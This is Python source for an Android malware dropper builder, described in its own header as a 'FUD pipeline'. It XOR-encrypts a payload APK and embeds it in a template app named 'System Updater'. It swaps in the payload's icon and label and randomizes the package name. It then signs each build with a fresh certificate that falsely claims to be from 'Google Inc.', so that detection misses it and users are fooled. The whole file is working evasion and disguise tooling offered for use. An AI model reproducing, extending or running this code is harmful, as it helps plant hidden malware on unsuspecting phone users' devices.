"""FUD pipeline — advanced signing + icon/name swap + payload encryption."""
import os
import shutil
import subprocess
import time
import zipfile
import random
import string

from config import (
    PAYLOAD_XOR_KEY, TEMPLATE_APK, KEYSTORE_DIR,
    KEYSTORE_PASS, KEY_ALIAS, JAVA_BIN, APKSIGNER_BIN,
    ZIPALIGN_BIN, TOOLS_DIR,
)
from setup import ensure_tools
from apktool_wrapper import decompile, recompile


def _step(session_dir, msg):
    try:
        with open(os.path.join(session_dir, "step.txt"), "w") as f:
            f.write(msg)
    except Exception:
        pass
    print(f"\n===== {msg} =====", flush=True)


def _xor_encrypt(data: bytes, key: bytes) -> bytes:
    """Rolling XOR with byte swap — stronger than plain XOR."""
    out = bytearray(len(data))
    klen = len(key)
    for i, b in enumerate(data):
        idx = (i * 7 + 3) % klen
        out[i] = (b ^ key[idx]) & 0xFF
    return bytes(out)


def _xor_decrypt_smali_bytes(key: bytes) -> str:
    """Signed byte array for smali .array-data."""
    lines = []
    for i, b in enumerate(key):
        signed = b if b < 128 else b - 256
        lines.append(f"        {signed}t")
        if (i + 1) % 8 == 0 and i != len(key) - 1:
            lines.append("")
    return "\n".join(lines)


# ================== ICON + LABEL SWAP ==================

def _extract_app_identity(payload_apk: str):
    """Payload APK se icon files, label, aur package name nikaalo."""
    icons = {}
    try:
        with zipfile.ZipFile(payload_apk, "r") as z:
            for n in z.namelist():
                ln = n.lower()
                if not n.startswith("res/"):
                    continue
                if "ic_launcher" not in ln and "mipmap" not in ln:
                    continue
                if not ln.endswith((".png", ".webp", ".xml")):
                    continue
                try:
                    icons[n] = z.read(n)
                except Exception:
                    pass
    except Exception:
        pass

    # apktool se manifest se label nikaalo
    label = None
    try:
        tmp_dir = os.path.join("/tmp", "payload_meta")
        if os.path.exists(tmp_dir):
            shutil.rmtree(tmp_dir, ignore_errors=True)
        subprocess.run(
            [JAVA_BIN, "-jar", os.path.join(TOOLS_DIR, "apktool.jar"),
             "d", "-f", "-s", "-o", tmp_dir, payload_apk],
            capture_output=True, timeout=180,
        )
        mf = os.path.join(tmp_dir, "AndroidManifest.xml")
        if os.path.exists(mf):
            with open(mf) as f:
                for line in f:
                    if 'android:label="' in line:
                        start = line.index('android:label="') + 15
                        end = line.index('"', start)
                        label = line[start:end]
                        break
        shutil.rmtree(tmp_dir, ignore_errors=True)
    except Exception:
        pass

    return icons, label


# ================== PACKAGE RENAME ==================

def _rand_pkg():
    parts = []
    for _ in range(3):
        s = random.choice(string.ascii_lowercase)
        s += "".join(random.choices(string.ascii_lowercase + string.digits,
                                    k=random.randint(3, 7)))
        parts.append(s)
    return ".".join(parts)


def _rename_package(decompiled_dir: str) -> str:
    """Manifest + smali folders + smali refs + apktool.yml — poora rename."""
    import re

    manifest = os.path.join(decompiled_dir, "AndroidManifest.xml")
    with open(manifest, "r", encoding="utf-8") as f:
        mxml = f.read()

    m = re.search(r'package="([^"]+)"', mxml)
    if not m:
        raise RuntimeError("package attr missing")
    old_pkg = m.group(1)
    new_pkg = _rand_pkg()

    old_path = old_pkg.replace(".", "/")
    new_path = new_pkg.replace(".", "/")

    # 1) manifest string replace
    mxml = mxml.replace(f'package="{old_pkg}"', f'package="{new_pkg}"')
    mxml = mxml.replace(f'android:name="{old_pkg}.', f'android:name="{new_pkg}.')
    mxml = mxml.replace(f'android:targetPackage="{old_pkg}"',
                        f'android:targetPackage="{new_pkg}"')
    with open(manifest, "w", encoding="utf-8") as f:
        f.write(mxml)

    # 2) smali folders + refs
    for d in os.listdir(decompiled_dir):
        full = os.path.join(decompiled_dir, d)
        if not os.path.isdir(full):
            continue
        if d != "smali" and not d.startswith("smali_classes"):
            continue

        src_dir = os.path.join(full, old_path)
        dst_dir = os.path.join(full, new_path)
        if os.path.isdir(src_dir):
            os.makedirs(os.path.dirname(dst_dir), exist_ok=True)
            if os.path.exists(dst_dir):
                shutil.rmtree(dst_dir)
            shutil.move(src_dir, dst_dir)

        old_ref = f"L{old_path}/"
        new_ref = f"L{new_path}/"
        for dirpath, _, files in os.walk(full):
            for fn in files:
                if not fn.endswith(".smali"):
                    continue
                fp = os.path.join(dirpath, fn)
                try:
                    with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                        txt = f.read()
                except Exception:
                    continue
                if old_ref in txt:
                    txt = txt.replace(old_ref, new_ref)
                    with open(fp, "w", encoding="utf-8") as f:
                        f.write(txt)

    # 3) apktool.yml
    yml = os.path.join(decompiled_dir, "apktool.yml")
    if os.path.exists(yml):
        with open(yml, "r", encoding="utf-8", errors="ignore") as f:
            txt = f.read()
        txt = txt.replace(old_pkg, new_pkg)
        with open(yml, "w", encoding="utf-8") as f:
            f.write(txt)

    # 4) res XML string replace (best-effort)
    for dirpath, _, files in os.walk(os.path.join(decompiled_dir, "res")):
        for fn in files:
            if not fn.endswith(".xml"):
                continue
            fp = os.path.join(dirpath, fn)
            try:
                with open(fp, "r", encoding="utf-8", errors="ignore") as f:
                    txt = f.read()
            except Exception:
                continue
            if old_pkg in txt:
                txt = txt.replace(old_pkg, new_pkg)
                with open(fp, "w", encoding="utf-8") as f:
                    f.write(txt)

    print(f"[✓] package renamed: {old_pkg} → {new_pkg}", flush=True)
    return new_pkg


# ================== ADVANCED SIGNING ==================

def _generate_rotating_keystore(session_dir: str) -> str:
    """
    Har build ke liye naya 4096-bit RSA keystore — different serial,
    different validity, same DN (Google-style).
    """
    os.makedirs(KEYSTORE_DIR, exist_ok=True)
    ks_path = os.path.join(KEYSTORE_DIR,
                           f"ks_{int(time.time())}_{random.randint(1000,9999)}.p12")

    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives.serialization import pkcs12
    import datetime

    key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COUNTRY_NAME,             "US"),
        x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME,   "California"),
        x509.NameAttribute(NameOID.LOCALITY_NAME,            "Mountain View"),
        x509.NameAttribute(NameOID.ORGANIZATION_NAME,        "Google Inc."),
        x509.NameAttribute(NameOID.ORGANIZATIONAL_UNIT_NAME, "Android"),
        x509.NameAttribute(NameOID.COMMON_NAME,              "Android"),
    ])
    now = datetime.datetime.utcnow()
    cert = (
        x509.CertificateBuilder()
        .subject_name(subject).issuer_name(issuer)
        .public_key(key.public_key())
        .serial_number(x509.random_serial_number())
        .not_valid_before(now - datetime.timedelta(days=1))
        .not_valid_after(now + datetime.timedelta(days=10950))
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
        .add_extension(x509.KeyUsage(
            digital_signature=True, content_commitment=False,
            key_encipherment=False, data_encipherment=False,
            key_agreement=False, key_cert_sign=False, crl_sign=False,
            encipher_only=False, decipher_only=False,
        ), critical=True)
        .sign(key, hashes.SHA384())
    )
    p12 = pkcs12.serialize_key_and_certificates(
        name=KEY_ALIAS.encode(), key=key, cert=cert, cas=None,
        encryption_algorithm=serialization.BestAvailableEncryption(KEYSTORE_PASS.encode()),
    )
    with open(ks_path, "wb") as f:
        f.write(p12)
    print(f"[✓] rotating keystore: {os.path.basename(ks_path)}", flush=True)
    return ks_path


def _sign_apk(unsigned_apk: str, output_apk: str, session_dir: str):
    """Sign with v1+v2+v3+v4 using fresh 4096-bit keystore."""
    ks_path = _generate_rotating_keystore(session_dir)
    aligned = unsigned_apk + ".aligned"

    # zipalign
    subprocess.run(
        [ZIPALIGN_BIN, "-f", "-p", "4", unsigned_apk, aligned],
        check=True, capture_output=True,
    )

    # apksigner with all schemes
    cmd = [
        APKSIGNER_BIN, "sign",
        "--ks", ks_path,
        "--ks-pass", f"pass:{KEYSTORE_PASS}",
        "--ks-key-alias", KEY_ALIAS,
        "--key-pass", f"pass:{KEYSTORE_PASS}",
        "--v1-signing-enabled", "true",
        "--v2-signing-enabled", "true",
        "--v3-signing-enabled", "true",
        "--v4-signing-enabled", "true",
        "--out", output_apk,
        aligned,
    ]
    p = subprocess.run(cmd, capture_output=True, text=True)
    if p.returncode != 0:
        raise RuntimeError(f"apksigner failed:\n{p.stdout}\n{p.stderr}")

    if os.path.exists(aligned):
        os.remove(aligned)
    print(f"[✓] signed (v1+v2+v3+v4) → {output_apk}", flush=True)


# ================== MAIN PIPELINE ==================

def full_fud_pipeline_dropper(template_apk: str, payload_apk: str,
                              output_apk: str, session_dir: str) -> str:
    _step(session_dir, "ensure_tools")
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    if not os.path.exists(template_apk):
        raise RuntimeError("template missing")

    # 1) payload identity (icon + label) extract
    _step(session_dir, "1/7 extract payload identity")
    icons, payload_label = _extract_app_identity(payload_apk)
    print(f"[i] {len(icons)} icon files, label={payload_label}", flush=True)

    # 2) payload encrypt
    _step(session_dir, "2/7 encrypt payload")
    with open(payload_apk, "rb") as f:
        payload_bytes = f.read()
    encrypted = _xor_encrypt(payload_bytes, PAYLOAD_XOR_KEY)
    print(f"[✓] {len(payload_bytes)} → {len(encrypted)} bytes (encrypted)", flush=True)

    # 3) decompile template
    _step(session_dir, "3/7 decompile template")
    decompiled = os.path.join(session_dir, "decompiled")
    decompile(template_apk, decompiled)

    # 4) inject smali XOR key + icon swap
    _step(session_dir, "4/7 inject icon/key")
    # 4a) icon swap — template res me payload icons daalo
    for icon_path, icon_data in icons.items():
        dst = os.path.join(decompiled, icon_path)
        os.makedirs(os.path.dirname(dst), exist_ok=True)
        with open(dst, "wb") as f:
            f.write(icon_data)
        # public.xml entry check
        pub = os.path.join(decompiled, "res", "values", "public.xml")
        if os.path.exists(pub):
            # simple replace: same filename keep karo
            pass

    # 4b) label swap — strings.xml me app_name update
    strings_path = os.path.join(decompiled, "res", "values", "strings.xml")
    if os.path.exists(strings_path) and payload_label:
        with open(strings_path, "r", encoding="utf-8") as f:
            sx = f.read()
        sx = sx.replace('name="app_name">System Updater<',
                        f'name="app_name">{payload_label}<')
        with open(strings_path, "w", encoding="utf-8") as f:
            f.write(sx)

    # 4c) smali me XOR key already hardcoded hai (template me daala tha)
    # L() method me :array_216 already hai

    # 5) package rename
    _step(session_dir, "5/7 rename package")
    _rename_package(decompiled)

    # 6) recompile
    _step(session_dir, "6/7 recompile")
    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    # 7) inject encrypted payload into assets/output.apk
    _step(session_dir, "7/7 inject payload + sign")
    tmp = unsigned + ".tmp"
    with zipfile.ZipFile(unsigned, "r") as zin, \
         zipfile.ZipFile(tmp, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            fn = item.filename
            if fn.startswith("META-INF/") or fn == "assets/output.apk":
                continue
            data = zin.read(fn)
            if fn.endswith(".dex") or fn == "resources.arsc" or fn == "AndroidManifest.xml":
                zout.writestr(item, data, compress_type=zipfile.ZIP_STORED)
            else:
                zout.writestr(item, data)

        info = zipfile.ZipInfo("assets/output.apk")
        info.compress_type = zipfile.ZIP_STORED
        zout.writestr(info, encrypted)

    shutil.move(tmp, unsigned)

    # Sign
    _sign_apk(unsigned, output_apk, session_dir)
    _step(session_dir, "done")
    print(f"[✓] DROPPER DONE → {output_apk}", flush=True)
    return output_apk


def full_fud_pipeline(input_apk: str, output_apk: str, session_dir: str) -> str:
    """Template ke bina — plain repackage + sign."""
    _step(session_dir, "ensure_tools")
    ensure_tools()
    os.makedirs(session_dir, exist_ok=True)

    _step(session_dir, "1/3 decompile")
    decompiled = os.path.join(session_dir, "decompiled")
    decompile(input_apk, decompiled)

    _step(session_dir, "2/3 rename + recompile")
    _rename_package(decompiled)
    unsigned = os.path.join(session_dir, "unsigned.apk")
    recompile(decompiled, unsigned)

    _step(session_dir, "3/3 sign")
    _sign_apk(unsigned, output_apk, session_dir)
    return output_apk
